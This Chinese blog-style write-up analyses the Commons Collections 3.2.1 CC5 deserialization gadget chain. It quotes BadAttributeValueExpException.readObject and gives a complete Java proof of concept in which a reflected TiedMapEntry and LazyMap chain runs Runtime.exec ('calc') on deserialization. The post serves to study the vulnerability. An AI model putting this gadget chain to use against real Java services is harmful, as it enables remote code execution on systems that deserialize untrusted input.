# 分析版本

Commons Collections 3.2.1

JDK 8u65

环境配置参考[JAVA安全初探(三):CC1链全分析](

# 分析过程

CC6是在CC1 LazyMap利用链(引用)的基础上。

CC5和CC6相似都是CC1 LazyMap利用链(引用)的基础上，改变了到LazyMap的入口类。

![image-20240708201259311](https://s2.loli.net/2024/07/08/jf2HQZvmR73yl9g.png)

CC6是用TiedMapEntry的hashCode方法，调用getValue，再调用LazyMap.get

CC5是用TiedMapEntry的toString方法，调用getValue，再调用LazyMap.get

再继续向上找toString，作者找到了BadAttributeValueExpException类，可序列化，还重写了readObject方法。

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ObjectInputStream.GetField gf = ois.readFields();
    Object valObj = gf.get("val", null);

    if (valObj == null) {
        val = null;
    } else if (valObj instanceof String) {
        val= valObj;
    } else if (System.getSecurityManager() == null
            || valObj instanceof Long
            || valObj instanceof Integer
            || valObj instanceof Float
            || valObj instanceof Double
            || valObj instanceof Byte
            || valObj instanceof Short
            || valObj instanceof Boolean) {
        val = valObj.toString();
    } else { // the serialized object is from a version without JDK-8019292 fix
        val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
    }
}
```

其中Object val可以通过反射进行赋值，

Poc（我是在CC6的基础上改的）

```java
public class cc5 {
//    //LazyMap
//    BadAttributeValueExpException
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
                new ConstantTransformer("1")
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer);
        //断掉利用链 TiedMapEntry, LazyMap, ChainedTransformer都可以
        //举个例子修改tiedMapEntry的 key
        TiedMapEntry tiedMapEntry = new TiedMapEntry(new HashMap(), 1);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1);
        Field val = badAttributeValueExpException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, tiedMapEntry);

        //复原
        //因为key为private，而且也没有public方法能直接修改key
        //利用反射
        Class c = TiedMapEntry.class;
        Field key = c.getDeclaredField("map");
        key.setAccessible(true);
        key.set(tiedMapEntry, lazyMap);

        //cc1_poc.serialize(badAttributeValueExpException);
        cc1_poc.unserialize("s.ser");
    }
}
```